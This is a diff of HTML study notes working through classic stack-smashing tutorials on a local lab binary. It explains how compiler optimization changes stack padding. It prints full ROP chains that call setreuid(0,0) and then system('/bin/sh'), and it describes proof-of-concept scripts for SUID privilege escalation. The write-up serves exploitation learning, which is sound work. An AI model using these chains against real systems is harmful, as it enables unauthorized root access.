-<a class="sourceLine" id="cb6-6" data-line-number="6"><span class="st">    pack('&lt;Q', 0x0000555555555271) +    # Address of pop rsi; pop r15; ret in function __libc_csu_init</span></a>
-<a class="sourceLine" id="cb6-7" data-line-number="7"><span class="st">    pack('&lt;Q', 0x0000000000000000) +    # Value 0 =&gt; uid of root (into rsi)</span></a>
-<a class="sourceLine" id="cb6-8" data-line-number="8"><span class="st">    pack('&lt;Q', 0x4141411411414141) +    # Junk (into r15)</span></a>
-<a class="sourceLine" id="cb6-9" data-line-number="9"><span class="st">    pack('&lt;Q', 0x00007ffff7eda920) +    # Address of function setreuid</span></a>
-<a class="sourceLine" id="cb6-10" data-line-number="10"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
-<a class="sourceLine" id="cb6-11" data-line-number="11"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
-<a class="sourceLine" id="cb6-12" data-line-number="12"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
-<a class="sourceLine" id="cb6-13" data-line-number="13"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb14-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
+<a class="sourceLine" id="cb14-2" data-line-number="2"><span class="st">    b'A' * 104 +                        # Padding to reach the return address</span></a>
+<a class="sourceLine" id="cb14-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x00005555555551da) +    # Address of ret in function vuln</span></a>
+<a class="sourceLine" id="cb14-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb14-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x0000000000000000) +    # Value 0 =&gt; uid of root</span></a>
+<a class="sourceLine" id="cb14-6" data-line-number="6"><span class="st">    pack('&lt;Q', 0x0000555555555271) +    # Address of pop rsi; pop r15; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb14-7" data-line-number="7"><span class="st">    pack('&lt;Q', 0x0000000000000000) +    # Value 0 =&gt; uid of root (into rsi)</span></a>
+<a class="sourceLine" id="cb14-8" data-line-number="8"><span class="st">    pack('&lt;Q', 0x4141411411414141) +    # Junk (into r15)</span></a>
+<a class="sourceLine" id="cb14-9" data-line-number="9"><span class="st">    pack('&lt;Q', 0x00007ffff7eda920) +    # Address of function setreuid</span></a>
+<a class="sourceLine" id="cb14-10" data-line-number="10"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb14-11" data-line-number="11"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
+<a class="sourceLine" id="cb14-12" data-line-number="12"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
+<a class="sourceLine" id="cb14-13" data-line-number="13"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
 <p>This code additionally calls <code>setreuid(0, 0)</code> before spawning the shell.</p>
 <p>Note: when working through this exercise, I could not just get the addresses from the executable but had to get the addresses from GDB. This is because the executable by default is compiled as PIE (Position Independent Executable). The addresses in the executable (e.g. showed by <code>objdump -d vulnerable</code>) are only offsets from the base address. The base address (<code>0x0000555555554000</code>) is always the same, because ASLR is disabled. When knowing this base address, one could just calculate all other addresses in the executable by adding the given offset to the base address.<br />
 If compiled with the compiler flag <code>-fno-pic</code> and the linker flag <code>-no-pie</code>, the executable would contain the absolute addresses of the instructions instead of relative ones relative to the base address. This would make it probably easier to find the addresses (in the code snippet above: addresses for the <code>ret</code> instruction, <code>pop rdi; ret</code> and <code>/bin/sh</code>) because it would be sufficient to just look at the executable without loading it into a debugger. However, it would probably still be necessary to get the address of the <code>system</code> function by loading it into a debugger, as libc is only dynamically loaded on runtime and the address thus can only be determined by either knowing the offset of <code>system</code> in libc and at which base address libc will be loaded or by loading the executable into GDB and just printing the address with <code>p system</code>.</p>
@@ -304,6 +418,46 @@ The solution is as follows: the address provided in the tutorial to write the �
 </ol>
 <p>The final exploit code crafted from the addresses found in the executable (compiled/linked as non-PIE) and the aforementioned approaches to find offsets and addresses is located in the <a href="./64bit%20Stack%20smashing%20-%20superkojiman/poc.py">poc.py</a> Python script. It relies on the executable being available over the network as mentioned above.</p>
 <p>However, it is also possible to launch such an exploit locally. This was conducted using the Python <code>pwntools</code>. The <a href="./64bit%20Stack%20smashing%20-%20superkojiman/poc_local.py">poc_local.py</a> contains the code for a local exploit. In addition to the original exploit, this variant also calls <code>setreuid</code> in order to achieve privilege escalation when a vulnerable executable with the SUID bit set is exploited.</p>
+<h2 id="optimized-compilation-1">Optimized compilation</h2>
+<p>As with the executables from the <a href="#smashing-the-stack-for-fun-and-profit---aleph1">Aleph1 exploits</a>, no compiler optimizations were activated during the compilation of the executables used for the three parts of the tutorial. With optimizations enabled (<code>-O3</code> flag), the exploits have to be conducted a little bit different, which is explained in the following.</p>
+<h3 id="part-1-1">Part 1</h3>
+<p>The <a href="#part-1">first part</a> was just about overflowing a buffer and overwriting the return address with the address of an environment variable on the stack. The main difference here is that GCC tries to keep some variables only in registers if possible when optimization is enabled.</p>
+<p>Here, the variable <code>int r</code> is affected by such an optimization.<br />
+In the non-optimized version, 96 bytes on the stack are reserved for the buffer <code>buf</code> and the integer variable <code>r</code>. Those 96 bytes are divided into 80 bytes for the buffer and 16 bytes for the integer. <code>r</code> as a 32 bit integer should theoretically only need 4 bytes of memory on the stack. However, the stack by default is always aligned on 16 bytes on x86_64 / amd64 architectures which is why 96 bytes of stack memory are allocated.<br />
+In the optimized version, only 80 bytes on the stack are reserved for the buffer <code>buf</code>. The integer variable <code>r</code> is never written on the stack. As a return value of the call to <code>read</code>, <code>r</code> is located in the register <code>rax</code> after that call. The value is then directly copied from <code>rax</code> to <code>rsi</code> which holds a parameter for <code>printf</code>. Thus, only 80 bytes of stack memory are necessary here.</p>
+<p>This is the reason why the overflow with the <code>pwn_vulnerable.sh</code> script does not work: Initially, it overwrites 104 bytes with junk (80 bytes for <code>buf</code>, 16 bytes for <code>r</code> and padding, 8 bytes for the saved frame pointer) and then the return address with the address of the environment variable. With the optimized executable, it should only overwrite 88 bytes (80 bytes for <code>buf</code>, 8 bytes for the saved frame pointer) with junk. As it overwrites 104 bytes, it also overwrites the return address with junk which is why returning from the vulnerable function gives a segmentation fault.</p>
+<p>This issue can easily be resolved with a small change to the exploit script by changing <a href="./64bit%20Stack%20smashing%20-%20superkojiman/pwn_vulnerable.sh#L14">line 14</a> from</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb15-1" data-line-number="1"><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 104 + pack('&lt;Q', </span><span class="va">$(</span><span class="bu">echo</span> <span class="va">$addr)</span><span class="st">))&quot;</span></a></code></pre></div>
+<p>to</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb16-1" data-line-number="1"><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(b'A' * 88 + pack('&lt;Q', </span><span class="va">$(</span><span class="bu">echo</span> <span class="va">$addr)</span><span class="st">) * 3)&quot;</span></a></code></pre></div>
+<p>Instead of providing 104 bytes of junk and an 8 byte address (= 112 bytes total), it then provides 88 bytes of junk and three times an 8 byte address (= 112 bytes total).<br />
+For the non-optimized vulnerable executable, this doesn’t make a difference for the result. The only difference is that the last 8 bytes before the saved frame pointer and the saved frame pointer are overwritten with the address we want to return to instead of junk.<br />
+For the optimized vulnerable executable, the return address is now written to the right position on the stack. The buffer and the saved frame pointer are completely overwritten with the junk in this case. In this case, parts of the previous stack frame are also overwritten (i.e. the lowest 16 bytes with twice the address). However, as we just want to return to the shellcode, this doesn’t make a difference for the result here.</p>
+<h3 id="part-2-1">Part 2</h3>
+<p>For part 2 of the tutorial, basically the same changes apply as for <a href="#part-1-1">part 1</a>. Instead of padding with 104 bytes of junk, we only need 88 bytes of padding if the executable is compiled with compiler optimizations.</p>
+<p>In addition to that, we’re not overwriting the return address with a stack address that we determined before but with the address of an instruction in the same executable. Because of the compiler options being enabled, GCC may output the code at different offsets (position independent executables, PIE) or addresses (non-PIE). This is exactly what happens here: The address of the <code>ret</code> instruction in the <code>vuln</code> function changed. Luckily, all other addresses stayed the same despite the optimized code. This explicitely means that the addresses referring to <code>__libc_csu_init</code> and the <code>/bin/sh</code> string didn’t change. The addresses for the functions from libc (i.e. <code>system</code> and <code>setreuid</code>) didn’t change as libc is always loaded at the same base address, no matter whether the executable was compiled with compiler optimizations enabled or not.</p>
+<p>Thus, it is sufficient to change the lines</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb17-1" data-line-number="1">    b<span class="st">'A'</span> <span class="op">*</span> <span class="dv">104</span> <span class="op">+</span>                        <span class="co"># Padding to reach the return address</span></a>
+<a class="sourceLine" id="cb17-2" data-line-number="2">    pack(<span class="st">'&lt;Q'</span>, <span class="bn">0x00005555555551da</span>) <span class="op">+</span>    <span class="co"># Address of ret in function vuln</span></a></code></pre></div>
+<p>to</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb18-1" data-line-number="1">    b<span class="st">'A'</span> <span class="op">*</span><span class="dv">88</span> <span class="op">+</span>                          <span class="co"># Padding to reach the return address</span></a>
+<a class="sourceLine" id="cb18-2" data-line-number="2">    pack(<span class="st">'&lt;Q'</span>, <span class="bn">0x0000555555555204</span>) <span class="op">+</span>    <span class="co"># Address of ret in function vuln</span></a></code></pre></div>
+<p>in the <a href="#part-2">original exploit codes</a>.</p>
+<p>Giving just the exploit code including the <code>setreuid</code> call, this change results in the following code, working for the optimized executable:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><a class="sourceLine" id="cb19-1" data-line-number="1"><span class="kw">(</span><span class="ex">python3</span> -c <span class="st">&quot;from struct import pack; import sys; sys.stdout.buffer.write(</span></a>
+<a class="sourceLine" id="cb19-2" data-line-number="2"><span class="st">    b'A' * 88 +                         # Padding to reach the return address</span></a>
+<a class="sourceLine" id="cb19-3" data-line-number="3"><span class="st">    pack('&lt;Q', 0x0000555555555204) +    # Address of ret in function vuln</span></a>
+<a class="sourceLine" id="cb19-4" data-line-number="4"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb19-5" data-line-number="5"><span class="st">    pack('&lt;Q', 0x0000000000000000) +    # Value 0 =&gt; uid of root</span></a>
+<a class="sourceLine" id="cb19-6" data-line-number="6"><span class="st">    pack('&lt;Q', 0x0000555555555271) +    # Address of pop rsi; pop r15; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb19-7" data-line-number="7"><span class="st">    pack('&lt;Q', 0x0000000000000000) +    # Value 0 =&gt; uid of root (into rsi)</span></a>
+<a class="sourceLine" id="cb19-8" data-line-number="8"><span class="st">    pack('&lt;Q', 0x4141411411414141) +    # Junk (into r15)</span></a>
+<a class="sourceLine" id="cb19-9" data-line-number="9"><span class="st">    pack('&lt;Q', 0x00007ffff7eda920) +    # Address of function setreuid</span></a>
+<a class="sourceLine" id="cb19-10" data-line-number="10"><span class="st">    pack('&lt;Q', 0x0000555555555273) +    # Address of pop rdi; ret in function __libc_csu_init</span></a>
+<a class="sourceLine" id="cb19-11" data-line-number="11"><span class="st">    pack('&lt;Q', 0x000055555555603f) +    # Address of &quot;</span>/bin/sh<span class="st">&quot; in function main</span></a>
+<a class="sourceLine" id="cb19-12" data-line-number="12"><span class="st">    pack('&lt;Q', 0x00007ffff7e18410)      # Address of function system</span></a>
+<a class="sourceLine" id="cb19-13" data-line-number="13"><span class="st">    )&quot;</span><span class="kw">;</span> <span class="fu">cat</span><span class="kw">)</span> <span class="kw">|</span> <span class="ex">./vulnerable</span></a></code></pre></div>
+<p>For the non-optimized version, the original code has to be used. Thus, it is in that case not possible to create a single input that triggers the vulnerability in both the non-optimized and the optimized executable reliably.</p>
 <h1 id="aslr-smack-and-laugh">ASLR Smack and Laugh</h1>
 <p>The <a href="ttps://api.semanticscholar.org/CorpusID:16401261">ASLR Smack &amp; Laugh Reference</a> by Tilo Müller, published in 2008, describes several methods how to bypass protection by Address Space Layout Randomization built into the Linux kernel.<br />
 As he uses a Linux installation with kernel 2.6.23, glibc 2.6.1 and gcc 4.2.3, several of his described exploits might not work as described on modern machines. Additionally, his machine is a 32 bit machine which is why all the executables are compiled in 32 bit mode (see the <a href="./ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/Makefile">Makefile</a>).</p>
